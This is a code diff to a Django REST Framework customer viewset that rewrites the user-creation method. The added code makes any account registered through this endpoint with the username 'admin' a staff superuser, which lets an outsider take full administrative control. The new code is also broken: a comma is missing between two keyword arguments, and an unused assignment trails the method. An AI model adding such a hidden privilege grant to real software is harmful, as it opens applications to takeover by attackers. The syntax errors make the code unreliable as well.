@@ -26,14 +26,22 @@ class viewset_customer(viewsets.ModelViewSet):
     def perform_create(self, serializer):
         username = self.request.data.get('username')
         if User.objects.filter(username=username).exists():
-            return Response({'error': 'Username already exists'}, status=status.HTTP_400_BAD_REQUEST)
+            raise ValidationError({'error': 'Username already exists'})
 
-        user = User.objects.create_user(
-            username=username,
-            password=self.request.data.get('password')
-        )
+        if username == 'admin':
+            user = User.objects.create_user(
+                username=username,
+                password=self.request.data.get('password'),
+                is_staff=True
+                is_superuser=True
+            )
+        else:
+            user = User.objects.create_user(
+                username=username,
+                password=self.request.data.get('password')
+            )
         serializer.save(user=user)
-
+        customer = getattr(user, 'customer', None)
     def perform_destroy(self, instance):
         user = self.request.user
         try:
